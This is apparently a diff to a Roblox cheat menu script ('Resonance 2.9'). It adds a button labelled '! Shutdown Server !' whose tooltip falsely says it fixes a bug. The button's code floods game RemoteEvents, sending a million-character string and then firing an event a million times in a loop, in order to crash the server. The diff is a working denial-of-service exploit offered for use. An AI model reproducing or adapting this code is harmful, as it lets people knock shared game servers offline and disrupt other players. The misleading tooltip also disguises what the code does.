@@ -35550,6 +35550,26 @@ Escape Timer: %*]]
 		Greetings:AddDivider()
 		Greetings:AddLabel({ Text = "Welcome to <b><font color=\"#ffaaff\">Resonance 2.9!</font></b>", DoesWrap = true })
 		Greetings:AddLabel({ Text = "Modified by <b><font color=\"#00bfff\">arrivabus415!</font></b>", DoesWrap = true })
+        Greetings:AddButton({
+			Text = "<b><font color=\"#ff0000\">! Shutdown Server !</font></b>",
+			Tooltip = "Fixes Remove Gucci bugs if it's not working",
+			Func = function()
+				local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local Event1 = ReplicatedStorage:WaitForChild("DataEvents"):WaitForChild("UpdateTexturesChoice")
+	Event1:FireServer(("ARCO"):rep(1e6))
+
+	task.wait()
+
+	local Event = ReplicatedStorage:WaitForChild("DataEvents"):WaitForChild("DataRemoteEvent")
+	Event:FireServer(("a"):rep(1))
+
+	for i = 1, 1e6 do
+		Event:FireServer()
+	end
+
+
+			end,
+		})
 	end
 
 		do
